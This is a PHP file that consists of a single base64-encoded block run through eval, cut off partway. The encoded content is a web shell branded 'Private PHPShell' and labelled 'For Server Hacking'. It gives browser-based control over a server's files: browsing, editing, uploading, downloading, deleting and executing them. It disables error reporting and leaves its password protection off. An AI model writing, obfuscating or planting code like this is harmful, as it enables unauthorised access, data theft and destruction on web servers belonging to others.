<?php eval(base64_decode('Pz48P3BocCAKCgoKLyoKCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgUEhQU0hFTEwuUEhQICAgICAgICAgICAgICoKCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqIAoKKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICogIAoKKiAgIFdlbGNvbWUgdG8gTWFja2VyJ3MgUHJpdmF0ZSBQSFBTaGVsbCBzY3JpcHQuLi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAKCiogICBUaGlzIHNjcmlwdCB3aWxsIGFsbG93IHlvdSB0byBicm93c2Ugd2Vic2VydmVycyBldGMuLi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqIAoKKiAgIEp1c3QgY29weSB0aGUgZmlsZSB0byB5b3VyIGRpcmVjdG9yeSBhbmQgb3BlbiBpdCBpbiB5b3VyIEludGVybmV0IEJyb3dzZXIuICAgICAgICAgICogCgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiAKCiogICBUaGUgd2Vic2VydmVyIHNob3VsZCBzdXBwb3J0IFBIUC4uLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqIAoKKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICogCgoqICAgWW91IGNhbiBtb2RpZnkgdGhlIHNjcmlwdCBpZiB5b3Ugd2FudCwgYnV0IHBsZWFzZSBzZW5kIG1lIGEgY29weSB0bzogICAgICAgICAgICAgICAgKiAgCgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1BWDY2NkBpcmFuc3RhcnMuY29tICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICogCgoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiAKCgoKISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEgCgohISAgIFBMRUFTRSBOT1RFOiBZb3Ugc2hvdWxkIHVzZSB0aGlzIHNjcmlwdCBhdCBvd24gcmlzaywgaXQgc2hvdWxkIGRvIGRhbWFnZSB0byB0aGUgICAhISAKCiEhICAgICAgICAgICAgICAgIFNpdGVzIG9yIGV2ZW4gdGhlIHNlcnZlci4uLiBZb3UgYXJlIHJlc3BvbnNpYmxlIGZvciB5b3VyIG93biBkZWVkcy4gICEhIAoKISEgICAgICAgICAgICAgICAgVGhlIGFkbWluIG9mIHlvdXIgd2Vic2VydmVyIHNob3VsZCBhbHdheXMga25vdyB5b3UgYXJlIHVzaW5nIHRoaXMgICAgISEKCiEhICAgICAgICAgICAgICAgIHNjcmlwdC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICEhIAoKISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEgCgoqLyAKCgoKCgovKlNldHRpbmcgc29tZSBlbnZpcmlvbm1lbnQgdmFyaWFibGVzLi4uKi8gCgoKCi8qIEkgYWRkZWQgdGhpcyB0byBlbnN1cmUgdGhlIHNjcmlwdCB3aWxsIHJ1biBjb3JyZWN0bHkuLi4KCiAgIFBsZWFzZSBlbnRlciB0aGUgU2NyaXB0J3MgZmlsZW5hbWUgaW4gdGhpcyB2YXJpYWJsZS4gKi8gICAKCiRTRmlsZU5hbWU9JFBIUF9TRUxGOwoKCgovKiB1bmNvbW1lbnQgdGhlIHR3byBmb2xsb3dpbmcgdmFyaWFibGVzIGlmIHlvdSB3YW50IHRvIHVzZSBodHRwCgogICBhdXRoZW50aWNhdGlvbi4gVGhpcyB3aWxsIHBhc3N3b3JkIHByb3RlY3QgeW91ciBQSFBTaGVsbCAqLwoKLy8kaHR0cF9hdXRoX3VzZXIgPSAicGhwc2hlbGwiOwkvKiBIVFRQIEF1dGhvcmlzYXRpb24gdXNlcm5hbWUsIHVuY29tbWVudCBpZiB5b3Ugd2FudCB0byB1c2UgdGhpcyAqLwoKLy8kaHR0cF9hdXRoX3Bhc3MgPSAicGhwc2hlbGwiOwkvKiBIVFRQIEF1dGhvcmlzYXRpb24gcGFzc3dvcmQsIHVuY29tbWVudCBpZiB5b3Ugd2FudCB0byB1c2UgdGhpcyAqLwkgICAgCgoKCmVycm9yX3JlcG9ydGluZygwKTsKCiRQSFBWZXI9cGhwdmVyc2lvbigpOwoKJGlzR29vZHZlcj0oaW50dmFsKCRQSFBWZXJbMF0pPj00KTsKCiRzY3JpcHRUaXRsZSA9ICJQSFBTaGVsbCI7Cgokc2NyaXB0aWRlbnQgPSAiJHNjcmlwdFRpdGxlIGJ5IE1BWDY2NiI7CgoKCiR1cmxBZGQgPSAiIjsKCiRmb3JtQWRkID0gIiI7CgoKCmZ1bmN0aW9uIHdhbGtBcnJheSgkYXJyYXkpewoKICB3aGlsZSAobGlzdCgka2V5LCAkZGF0YSkgPSBlYWNoKCRhcnJheSkpCgogICAgaWYgKGlzX2FycmF5KCRkYXRhKSkgeyB3YWxrQXJyYXkoJGRhdGEpOyB9CgogICAgZWxzZSB7IGdsb2JhbCAkJGtleTsgJCRrZXkgPSAkZGF0YTsgZ2xvYmFsICR1cmxBZGQ7ICR1cmxBZGQgLj0gIiRrZXk9Ii51cmxlbmNvZGUoJGRhdGEpLiImIjt9Cgp9CgoKCmlmIChpc3NldCgkX1BVVCkpIHdhbGtBcnJheSgkX1BVVCk7CgppZiAoaXNzZXQoJF9HRVQpKSB3YWxrQXJyYXkoJF9HRVQpOwoKaWYgKGlzc2V0KCRfUE9TVCkpIHdhbGtBcnJheSgkX1BPU1QpOwoKCgoKCiRwb3MgPSBzdHJwb3MoJHVybEFkZCwgInM9ciIpOwoKaWYgKHN0cnZhbCgkcG9zKSAhPSAiIikgewoKJHVybEFkZD0gc3Vic3RyKCR1cmxBZGQsIDAsICRwb3MpOwoKfQoKCgokdXJsQWRkIC49ICImcz1yJiI7CgoKCmlmIChlbXB0eSgkUG1heCkpCgoJJFBtYXggPSAxMjU7ICAgLyogSWRlbnRpZmllcyB0aGUgbWF4IGFtb3VudCBvZiBEaXJlY3RvcmllcyBhbmQgZmlsZXMgbGlzdGVkIG9uIG9uZSBwYWdlICovCgppZiAoZW1wdHkoJFBpZHgpKSAKCgkkUGlkeCA9IDA7CgoKCiRkaXIgPSBzdHJfcmVwbGFjZSgiXFwiLCAiLyIsIHN0cl9yZXBsYWNlKCIvLyIsICIvIiwgc3RyX3JlcGxhY2UoIlxcXFwiLCAiXFwiLCAkZGlyICkpKTsKCiRmaWxlID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsIHN0cl9yZXBsYWNlKCJcXFxcIiwgIlxcIiwgJGZpbGUgKSkpOwoKCgokc2NyaXB0ZGF0ZSA9ICJGb3IgU2VydmVyIEhhY2tpbmciOwoKJHNjcmlwdHZlciA9ICJQcml2YXRlIEV4cGxvaXQiOwoKJExPQ0FMX0lNQUdFX0RJUiA9ICJpbWciOwoKJFJFTU9URV9JTUFHRV9VUkwgPSAiaW1nIjsKCiRpbWcgPSBhcnJheSgKCgkJCQkiRWRpdCIgCQk9PiAiZWRpdC5naWYiLAoKCQkJCSJEb3dubG9hZCIgCT0+ICJkb3dubG9hZC5naWYiLAoKCQkJCSJVcGxvYWQiIAk9PiAidXBsb2FkLmdpZiIsCgoJCQkJIkRlbGV0ZSIgCT0+ICJkZWxldGUuZ2lmIiwKCgkJCQkiVmlldyIgCQk9PiAidmlldy5naWYiLAoKCQkJCSJSZW5hbWUiIAk9PiAicmVuYW1lLmdpZiIsCgoJCQkJIk1vdmUiIAkJPT4gIm1vdmUuZ2lmIiwKCgkJCQkiQ29weSIgCQk9PiAiY29weS5naWYiLAoKCQkJCSJFeGVjdXRlIiAJPT4gImV4ZWMuZ2lmIgoKICAgICAgICAgICAgKTsKCgoKd2hpbGUgKGxpc3QoJGlkLCAkaW0pPWVhY2goJGltZykpCgoJaWYgKGZpbGVfZXhpc3RzKCIkTE9DQUxfSU1BR0VfRElSLyRpbSIpKQoKCQkkaW1nWyRpZF0gPSAiPGltZyBoZWlnaHQ9XCIxNlwiIHdpZHRoPVwiMTZcIiBib3JkZXI9XCIwXCIgc3JjPVwiJFJFTU9URV9JTUFHRV9VUkwvJGltXCIgYWx0PVwiJGlkXCI+IjsKCgllbHNlCgogCQkkaW1nWyRpZF0gPSAiWyRpZF0iOwoKCgoKCgoKCgovKiBIVFRQIEFVVEhFTlRJQ0FUSU9OICovCgoKCiAgICBpZiAgKCAoIChpc3NldCgkaHR0cF9hdXRoX3VzZXIpICkgJiYgKGlzc2V0KCRodHRwX2F1dGhfcGFzcykpICkgJiYgKCAhaXNzZXQoJFBIUF9BVVRIX1VTRVIpIHx8ICRQSFBfQVVUSF9VU0VSICE9ICRodHRwX2F1dGhfdXNlciB8fCAkUEhQX0FVVEhfUFcgIT0gJGh0dHBfYXV0aF9wYXNzKSAgfHwgICgoJGxvZ29mZj09MSkgJiYgJG5vYXV0aD09InllcyIpICApICAgeyAKCgkgICAgc2V0Y29va2llKCJub2F1dGgiLCIiKTsKCgkgICAgSGVhZGVyKCAiV1dXLWF1dGhlbnRpY2F0ZTogIEJhc2ljIHJlYWxtPVwiJHNjcmlwdFRpdGxlICRzY3JpcHR2ZXJcIiIpOwoKCSAgICBIZWFkZXIoICJIVFRQLzEuMCAgNDAxICBVbmF1dGhvcml6ZWQiKTsKCgkgICAgZWNobyAiWW91ciB1c2VybmFtZSBvciBwYXNzd29yZCBpcyBpbmNvcnJlY3QiOwoKCSAgICBleGl0IDsKCgkJCSAgICAgCgogICAgfSAKCgoKZnVuY3Rpb24gYnVpbGRVcmwoJGRpc3BsYXksICR1cmwpIHsKCiAgICAgICAgZ2xvYmFsICR1cmxBZGQ7CgogICAgICAgICR1cmwgPSAkU0ZpbGVOYW1lIC4gIj8kdXJsQWRkJHVybCI7CgoJcmV0dXJuICI8YSBocmVmPVwiJHVybFwiPiRkaXNwbGF5PC9hPiI7Cgp9CgoKCmZ1bmN0aW9uIHNwKCRtcCkgewoKCWZvciAoICRpID0gMDsgJGkgPCAkbXA7ICRpKysgKQoKCQkkcmV0IC49ICImbmJzcDsiOwoKCXJldHVybiAkcmV0OwoKfQoKCgpmdW5jdGlvbiBzcGFjZXRvbmJzcCgkaW5zdHIpIHsgcmV0dXJuIHN0cl9yZXBsYWNlKCIgIiwgIiZuYnNwOyIsICRpbnN0cik7ICB9IAoKCgpmdW5jdGlvbiBNeWRlbGRpcigkRmRpcikgewoKCWlmIChpc19kaXIoJEZkaXIpKSB7CgoJCSRGaD1Ab3BlbmRpcigkRmRpcik7CgogCQl3aGlsZSAoJEZidWYgPSByZWFkZGlyKCRGaCkpCgogCQkJaWYgKCgkRmJ1ZiAhPSAiLiIpICYmICgkRmJ1ZiAhPSAiLi4iKSkKCgkJCQlNeWRlbGRpcigiJEZkaXIvJEZidWYiKTsKCgkJQGNsb3NlZGlyKCRGaCk7CgoJCQkJcmV0dXJuIHJtZGlyKCRGZGlyKTsKCgl9CWVsc2UgewoKCQlyZXR1cm4gdW5saW5rKCRGZGlyKTsKCgl9Cgp9CgoKCgoKZnVuY3Rpb24gYXJydmFsICgkYXJyYXkpIHsKCmxpc3QoJGtleSwgJGRhdGEpID0gJGFycmF5OwoKcmV0dXJuICRkYXRhOwoKfQoKCgpmdW5jdGlvbiBmb3JtYXRzaXplKCRpbnNpemUpIHsgIAoKCSRzaXplID0gJGluc2l6ZTsKCgkkYWRkID0gIkIiOwoKCWlmICgkc2l6ZSA+IDEwMjQpIHsKCiAJCSRzaXplID0gaW50dmFsKGludHZhbCgkc2l6ZSkgLyAxLjAyNCkvMTAwMDsKCiAJCSRhZGQgPSAiS0IiOwoKIAl9CgogCWlmICgkc2l6ZSA+IDEwMjQpIHsKCiAJCSRzaXplID0gaW50dmFsKGludHZhbCgkc2l6ZSkgLyAxLjAyNCkvMTAwMDsKCiAJCSRhZGQgPSAiTUIiOwoKIAl9CgogCWlmICgkc2l6ZSA+IDEwMjQpIHsKCiAJCSRzaXplID0gaW50dmFsKGludHZhbCgkc2l6ZSkgLyAxLjAyNCkvMTAwMDsKCiAJCSRhZGQgPSAiR0IiOwoKIAl9CgogCWlmICgkc2l6ZSA+IDEwMjQpIHsKCiAJCSRzaXplID0gaW50dmFsKGludHZhbCgkc2l6ZSkgLyAxLjAyNCkvMTAwMDsKCiAJCSRhZGQgPSAiVEIiOwoKIAl9CgogCXJldHVybiAiJHNpemUgJGFkZCI7Cgp9CgoKCmlmICgkY21kICE9ICJkb3dubCIpIHsKCgk/PgoKCgo8IS0tIDw/cGhwIGVjaG8gJHNjcmlwdGlkZW50ID8+LCA8P3BocCBlY2hvICRzY3JpcHR2ZXIgPz4sIDw/cGhwIGVjaG8gJHNjcmlwdGRhdGUgPz4gIC0tPgoKPEhUTUw+CgogPEhFQUQ+CgogIDxTVFlMRT4KCiAgPCEtLQoKICAgIEF7IHRleHQtZGVjb3JhdGlvbjpub25lOyBjb2xvcjpuYXZ5OyBmb250LXNpemU6IDEycHggfQoKICAgIGJvZHkgeyBmb250LXNpemU6IDEycHg7IAoKICAgICAgICAgICBmb250LWZhbWlseTogYXJpYWwsIGhlbHZldGljYTsKCiAgICAgICAgICAgIHNjcm9sbGJhci13aWR0aDogNTsKCiAgICAgICAgICAgIHNjcm9sbGJhci1oZWlnaHQ6IDU7CgogICAgICAgICAgICBzY3JvbGxiYXItZmFjZS1jb2xvcjogd2hpdGU7CgogICAgICAgICAgICBzY3JvbGxiYXItc2hhZG93LWNvbG9yOiBzaWx2ZXI7CgogICAgICAgICAgICBzY3JvbGxiYXItaGlnaGxpZ2h0LWNvbG9yOiB3aGl0ZTsKCiAgICAgICAgICAgIHNjcm9sbGJhci0zZGxpZ2h0LWNvbG9yOnNpbHZlcjsKCiAgICAgICAgICAgIHNjcm9sbGJhci1kYXJrc2hhZG93LWNvbG9yOiBzaWx2ZXI7CgogICAgICAgICAgICBzY3JvbGxiYXItdHJhY2stY29sb3I6IHdoaXRlOwoKICAgICAgICAgICAgc2Nyb2xsYmFyLWFycm93LWNvbG9yOiBibGFjazsKCiAgICB9CgogICAgVGFibGUgeyBmb250LXNpemU6IDEycHg7IH0KCiAgICBUUnsgZm9udC1zaXplOiAxMnB4OyB9CgogICAgVER7IGZvbnQtc2l6ZTogMTJweDsgCgogICAgICAgIGZvbnQtZmFtaWx5OiBhcmlhbCwgaGVsdmV0aWNhbDsKCiAgICAgICAgQk9SREVSLUxFRlQ6IGJsYWNrIDBweCBzb2xpZDsgCgoJQk9SREVSLVJJR0hUOiBibGFjayAwcHggc29saWQ7IAoKCUJPUkRFUi1UT1A6IGJsYWNrIDBweCBzb2xpZDsgCgoJQk9SREVSLUJPVFRPTTogYmxhY2sgMHB4IHNvbGlkOyAKCglDT0xPUjogYmxhY2s7IAoKICAgIH0KCiAgICAuYm9yZGVyeyAgICAgICBCT1JERVItTEVGVDogYmxhY2sgMXB4IHNvbGlkOwoKIAkJICAgQk9SREVSLVJJR0hUOiBibGFjayAxcHggc29saWQ7CgogCQkgICBCT1JERVItVE9QOiBibGFjayAxcHggc29saWQ7CgogCQkgICBCT1JERVItQk9UVE9NOiBibGFjayAxcHggc29saWQ7CgogCQkgfQoKICAgIC5ub25lICB7ICAgICAgIEJPUkRFUi1MRUZUOiBibGFjayAwcHggc29saWQ7CgogCQkgICBCT1JERVItUklHSFQ6IGJsYWNrIDBweCBzb2xpZDsKCiAJCSAgIEJPUkRFUi1UT1A6IGJsYWNrIDBweCBzb2xpZDsKCiAJCSAgIEJPUkRFUi1CT1RUT006IGJsYWNrIDBweCBzb2xpZDsKCiAJCSB9CgogICAgLmlucHV0dGV4dCB7CgoJCSAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRUZFRkVGOwoKCQkgICAgZm9udC1mYW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2E7CgoJCSAgICBib3JkZXI6IDFweCBzb2xpZCAjMDAwMDAwOwoKCQkgICAgaGVpZ2h0OiAyMDsKCiAgICB9CgogICAgLmxpZ2h0dGQgeyAgICAgICBiYWNrZ3JvdW5kOiAjRjhGOEY4OwoKICAgIH0KCiAgICAuZGFya3RkIHsgICAgICAgIGJhY2tncm91bmQ6ICNFOEU4RTg7CgogICAgfQoKICAgIGlucHV0IHsgZm9udC1mYW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2E7CgogICAgfQoKICAgIC5pbnB1dGJ1dHRvbiB7CgogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBzaWx2ZXI7CgoJCQlib3JkZXI6IDFweCBzb2xpZCAjMDAwMDAwOwoKCQkJYm9yZGVyLXdpZHRoOiAxcHg7CgoJCQloZWlnaHQ6IDIwOwoKICAgIH0KCiAgICAuaW5wdXR0ZXh0YXJlYSB7CgoJCSAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRUZFRkVGOwoKCQkgICAgYm9yZGVyOiAxcHggc29saWQgIzAwMDAwMDsKCgkJICAgIHNjcm9sbGJhci13aWR0aDogNTsKCgkJICAgIHNjcm9sbGJhci1oZWlnaHQ6IDU7CgoJCSAgICBzY3JvbGxiYXItZmFjZS1jb2xvcjogI0VGRUZFRjsKCgkJICAgIHNjcm9sbGJhci1zaGFkb3ctY29sb3I6IHNpbHZlcjsKCgkJICAgIHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6ICNFRkVGRUY7CgoJCSAgICBzY3JvbGxiYXItM2RsaWdodC1jb2xvcjpzaWx2ZXI7CgoJCSAgICBzY3JvbGxiYXItZGFya3NoYWRvdy1jb2xvcjogc2lsdmVyOwoKCQkgICAgc2Nyb2xsYmFyLXRyYWNrLWNvbG9yOiAjRUZFRkVGOwoKCQkgICAgc2Nyb2xsYmFyLWFycm93LWNvbG9yOiBibGFjazsKCiAgICB9CgogICAgLnRvcCB7IEJPUkRFUi1UT1A6IGJsYWNrIDFweCBzb2xpZDsgfQoKICAgIC50ZXh0aW4geyBCT1JERVItTEVGVDogc2lsdmVyIDFweCBzb2xpZDsKCiAgICAgICAgICAgICAgQk9SREVSLVJJR0hUOiBzaWx2ZXIgMXB4IHNvbGlkOwoKIAkgICAgICBCT1JERVItVE9QOiBzaWx2ZXIgMXB4IHNvbGlkOwoKICAgICAgICAgICAgICBCT1JERVItQk9UVE9NOiBzaWx2ZXIgMXB4IHNvbGlkOwoKICAgICAgICAgICAgICB3aWR0aDogOTklOyBmb250LXNpemU6IDEycHg7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogbmF2eTsKCiAgICAgICAgICAgIH0KCiAgICAubm90b3AgeyBCT1JERVItVE9QOiBibGFjayAwcHggc29saWQ7IH0KCiAgICAuYm90dG9tIHsgQk9SREVSLUJPVFRPTTogYmxhY2sgMXB4IHNvbGlkOyB9CgogICAgLm5vYm90dG9tIHsgQk9SREVSLUJPVFRPTTogYmxhY2sgMHB4IHNvbGlkOyB9CgogICAgLmxlZnQgeyBCT1JERVItTEVGVDogYmxhY2sgMXB4IHNvbGlkOyB9CgogICAgLm5vbGVmdCB7IEJPUkRFUi1MRUZUOiBibGFjayAwcHggc29saWQ7IH0KCiAgICAucmlnaHQgeyBCT1JERVItUklHSFQ6IGJsYWNrIDFweCBzb2xpZDsgfQoKICAgIC5ub3JpZ2h0IHsgQk9SREVSLVJJR0hUOiBibGFjayAwcHggc29saWQ7IH0KCiAgICAuc2lsdmVyeyBCQUNLR1JPVU5EOiBzaWx2ZXI7IH0KCiAgLS0+CgogIDwvU1RZTEU+CgogIDxUSVRMRT48P3BocCBlY2hvICRTRmlsZU5hbWUgPz48L1RJVExFPgoKIDwvSEVBRD4KCiA8Ym9keSB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiPgoKIDxkaXYgc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgYmFja2dyb3VuZDogd2hpdGU7IHotb3JkZXI6MTAwMDA7IHRvcDowOyBsZWZ0OjA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7Ij4KCiA8dGFibGUgd2lkdGg9MTAwJSBoZWlnaHQ9IjEwMCUiIE5PV1JBUCBib3JkZXI9IjAiPgoKICA8dHIgTk9XUkFQPgoKICAgPHRkIHdpZHRoPSIxMDAlIiBOT1dSQVA+CgogICAgPHRhYmxlIE5PV1JBUCB3aWR0aD0xMDAlIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4KCiAgICAgPHRyPgoKICAgICAgPHRkIHdpZHRoPSIxMDAlIiBjbGFzcz0ic2lsdmVyIGJvcmRlciI+CgogICAgICAgPGNlbnRlcj4KCgkgICAgPHN0cm9uZz4KCgkJIDxmb250IHNpemU9Mz48P3BocCBlY2hvICRzY3JpcHRpZGVudCA/PiAtIDw/cGhwIGVjaG8gJHNjcmlwdHZlciA/PiAtIDw/cGhwIGVjaG8gJHNjcmlwdGRhdGUgPz48L2ZvbnQ+CgogICAgICAgICAgICA8L3N0cm9uZz4KCiAgICAgICA8L2NlbnRlcj4KCiAgICAgIDwvdGQ+CgogICAgIDwvdHI+CgogICAgPC90YWJsZT48YnI+CgoKCgk8P3BocAoKfQoKCgppZiAoICRjbWQ9PSJkaXIiICkgewoKICAJJGg9QG9wZW5kaXIoJGRpcik7CgogCWlmICgkaCA9PSBmYWxzZSkgewoKICAJCWVjaG8gIjxicj48Zm9udCBjb2xvcj1cInJlZFwiPiIuc3AoMykuIlxuXG5cblxuCgogICAgICAgICAgICAgICAgQ09VTEQgTk9UIE9QRU4gVEhJUyBESVJFQ1RPUlkhISE8YnI+Ii5zcCgzKS4iXG4KCiAgICAgICAgICAgICAgICBUSEUgU0NSSVBUIFdJTEwgUkVTVUxUIElOIEFOIEVSUk9SISEhCgogICAgICAgICAgICAgICAgPGJyPjxicj4iLnNwKDMpLiJcbgoKICAgICAgICAgICAgICAgIFBMRUFTRSBNQUtFIFNVUkUgWU9VJ1ZFIEdPVCBSRUFEIFBFUk1JU1NJT05TIFRPIFRIRSBESVIuLi4KCiAgICAgICAgICAgICAgICA8YnI+PGJyPjwvZm9udD5cblxuXG5cbiI7CgogCX0KCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncmVhbHBhdGgnKSkgewoKCQkkcGFydGRpciA9IHJlYWxwYXRoKCRkaXIpOwoKCX0KCiAgICAgICAgZWxzZSB7CgoJCSRwYXJ0ZGlyID0gJGRpcjsKCgl9CgogCWlmIChzdHJsZW4oJHBhcnRkaXIpID49IDEwMCkgewoKIAkJJHBhcnRkaXIgPSBzdWJzdHIoJHBhcnRkaXIsIC0xMDApOwoKIAkJJHBvcyA9IHN0cnBvcygkcGFydGRpciwgIi8iKTsKCiAJCWlmIChzdHJ2YWwoJHBvcykgIT0gIiIpIHsKCiAJCQkkcGFydGRpciA9ICI8LS0gICAuLi4iLnN1YnN0cigkcGFydGRpciwgJHBvcyk7CgogCQl9CgogICAgICAgICRwYXJ0ZGlyID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsIHN0cl9yZXBsYWNlKCJcXFxcIiwgIlxcIiwgJHBhcnRkaXIgKSkpOwoKICAgICAgICAkZGlyID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsIHN0cl9yZXBsYWNlKCJcXFxcIiwgIlxcIiwgJGRpciApKSk7IAoKCSRmaWxlID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsIHN0cl9yZXBsYWNlKCJcXFxcIiwgIlxcIiwgJGZpbGUgKSkpOwoKIAl9CgogICAgPz4KCiAgICAgIDxmb3JtIG5hbWU9InVybGZvcm0iIGFjdGlvbj0iPD9waHAgZWNobyAiJFNGaWxlTmFtZT8kdXJsQWRkIjsgPz4iIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY21kIiB2YWx1ZT0iZGlyIj4KCiAgICAgICAgIDx0YWJsZSBOT1dSQVAgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4KCgkgIDx0cj4KCgkgICA8dGQgd2lkdGg9IjEwMCUiIGNsYXNzPSJzaWx2ZXIgYm9yZGVyIj4KCgkgICAgPGNlbnRlcj4mbmJzcDtIQVhQTE9SRVIgLSBTZXJ2ZXIgRmlsZXMgQnJvd3Nlci4uLiZuYnNwOzwvY2VudGVyPgoKCSAgIDwvdGQ+CgoJICA8L3RyPgoKCSA8L3RhYmxlPgoKICAgICAgIDxicj4KCgkgPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+CgoJICA8dHI+CgogICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyIG5vYm90dG9tIG5vcmlnaHQiPgoKICAgICAgICAgICAgJm5ic3A7QnJvd3Npbmc6Jm5ic3A7CgoJICA8L3RkPgoKICAgICAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgY2xhc3M9ImJvcmRlciBub2JvdHRvbSBub2xlZnQiPgoKICAgCSAgICA8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjEiIGNlbGxzcGFjaW5nPSIwIj4KCiAgICAgICAgICAgICA8dHI+CgogICAgICAgICAgICAgIDx0ZCBOT1dSQVAgd2lkdGg9Ijk5JSIgYWxpZ249ImNlbnRlciI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRpciIgY2xhc3M9Im5vbmUgdGV4dGluIiB2YWx1ZT0iPD9waHAgZWNobyAkcGFydGRpciA/PiI+PC90ZD4KCiAgICAgICAgICAgICAgPHRkIE5PV1JBUD48Y2VudGVyPiZuYnNwOzxhIGhyZWY9ImphdmFzY3JpcHQ6IHVybGZvcm0uc3VibWl0KCk7Ij48Yj5HTzxiPjwvYT4mbmJzcDs8Y2VudGVyPjwvdGQ+CgogICAgICAgICAgICAgPC90cj4KCiAgICAgICAgICAgIDwvdGFibGU+CgogICAgICAgICAgICAKCgkgIDwvdGQ+CgoJIDwvdHI+CgoJPC90YWJsZT4KCiAgPCEtLSAgICA8L2Zvcm0+ICAgLS0+CgogICAgICAgIDx0YWJsZSBOT1dSQVAgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiA+CgogICAgICAgICA8dHI+CgoJICA8dGQgd2lkdGg9IjEwMCUiIE5PV1JBUCBjbGFzcz0ic2lsdmVyIGJvcmRlciI+CgoJICAgJm5ic3A7RmlsZW5hbWUmbmJzcDsKCgkgIDwvdGQ+CgogICAgICAgICAgPHRkIE5PV1JBUCBjbGFzcz0ic2lsdmVyIGJvcmRlciBub2xlZnQiPgoKCSAgICZuYnNwO0FjdGlvbnMmbmJzcDsoQXR0ZW1wdCB0byBwZXJmb3JtKSZuYnNwOwoKCSAgPC90ZD4KCiAgICAgICAgICA8dGQgTk9XUkFQIGNsYXNzPSJzaWx2ZXIgYm9yZGVyIG5vbGVmdCI+CgoJICAgJm5ic3A7U2l6ZSZuYnNwOwoKCSAgPC90ZD4KCiAgICAgICAgICA8dGQgd2lkdGg9MSBOT1dSQVAgY2xhc3M9InNpbHZlciBib3JkZXIgbm9sZWZ0Ij4KCgkgICAmbmJzcDtBdHRyaWJ1dGVzJm5ic3A7CgoJICA8L3RkPgoKICAgICAgICAgIDx0ZCBOT1dSQVAgY2xhc3M9InNpbHZlciBib3JkZXIgbm9sZWZ0Ij4KCgkgICAmbmJzcDtNb2RpZmljYXRpb24gRGF0ZSZuYnNwOwoKCSAgPC90ZD4KCgkgPHRyPgoKICAgIDw/cGhwCgoKCgoKICAgICAgCS8qIDwhLS0gVGhpcyB3aG9sZSBoZWFwIG9mIGp1bmsgaXMgdGhlIHNvcnRpbmcgc2VjdGlvbi4uLiAqLwoKCgogCSRkaXJuIAk9IGFycmF5KCk7CgogCSRmaWxlbiAJPSBhcnJheSgpOwoKIAkkZmlsZXNpemVzCT0gMDsKCiAJd2hpbGUgKCRidWYgPSByZWFkZGlyKCRoKSkgewoKCSAgICBpZiAoaXNfZGlyKCIkZGlyLyRidWYiKSkKCgkJCSRkaXJuW10gPSAkYnVmOwoKICAgIAkJZWxzZSAKCiAJCQkkZmlsZW5bXSA9ICRidWY7CgogICAgCX0JIAkKCgkJJGRpcm5vIAk9IGNvdW50KCRkaXJuKSA